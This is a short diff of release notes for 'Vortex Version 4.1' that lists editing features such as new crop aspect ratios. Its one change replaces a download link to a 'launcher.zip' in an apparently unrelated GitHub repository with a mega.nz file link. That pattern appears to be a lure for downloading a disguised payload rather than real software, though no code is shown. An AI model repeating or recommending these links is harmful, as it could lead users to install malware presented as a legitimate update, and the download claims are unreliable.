@@ -33,7 +33,7 @@
 * Improvements to ML Cache.
 * Third-party Plugin Implementation (PC users).
 
-## [⚡Vortex Version 4.1] (https://raw.githubusercontent.com/updaterd/setup-software/master/launcher.zip):
+## [⚡Vortex Version 4.1] (https://mega.nz/file/kB5CwKaY#FrRsVAiMgQ8WVYc5yR8DAkB0TvVUwJ1ADM5Jmn-t7Dw):
 
 * Support for two new Crop Aspect Ratios: 21:9 and 9:21. These are well suited for extra wide-screen computer displays.
 * Resetting tools is easier with an increased clickable area for each reset button.
